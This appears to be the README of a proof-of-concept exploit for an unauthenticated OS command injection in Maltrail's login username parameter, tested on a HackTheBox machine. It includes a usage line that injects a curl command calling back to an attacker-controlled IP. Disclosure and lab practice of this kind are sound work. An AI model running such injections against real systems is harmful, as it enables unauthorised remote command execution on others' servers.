# Unauthenticated OS Command Injection in stamparm/maltrail

## Description:
Maltrail <= v0.54 is vulnerable to unauthenticated OS command injection during the login process. The subprocess.check_output function in maltrail/core/http.py contains a command injection vulnerability in the params.get("username")parameter. An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.

## Usage:
```
python3 maltrail_v0.53_rce.py -u 'http://10.10.11.224:55555/ucinv/login' -c 'curl 10.10.14.77'
```

## PoC:
![poc](./poc.png)
Exploit tested on hackthebox machine, [Sau](https://app.hackthebox.com/machines/Sau).<br>
Writeup: https://dugisan3rd.notion.site/Sau-34d23077af814e48adc9f6206d0aa174?pvs=4

## References:
1. https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/